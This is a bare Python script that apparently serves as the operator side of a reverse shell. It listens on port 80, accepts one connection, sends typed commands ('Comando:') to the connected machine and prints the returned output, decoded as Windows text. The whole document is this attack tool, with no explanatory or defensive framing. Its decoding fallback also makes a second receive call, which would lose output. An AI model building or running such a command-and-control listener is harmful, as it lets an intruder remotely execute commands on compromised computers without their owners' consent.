import socket
import subprocess


HOST = '0.0.0.0'  
PORT = 80  


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


server.bind((HOST, PORT))


server.listen(1)
print(f"HEARING {HOST}:{PORT}...")


client_socket, client_address = server.accept()
print(f"CONECTED {client_address}")


while True:

    command = input("Comando: ")

    if command.lower() == "exit":
        break


    client_socket.send(command.encode('utf-8'))


    try:
        output = client_socket.recv(1024).decode('windows-1252') 
    except UnicodeDecodeError:
        output = client_socket.recv(1024).decode('utf-8') 

    print(output)


client_socket.close()
server.close()

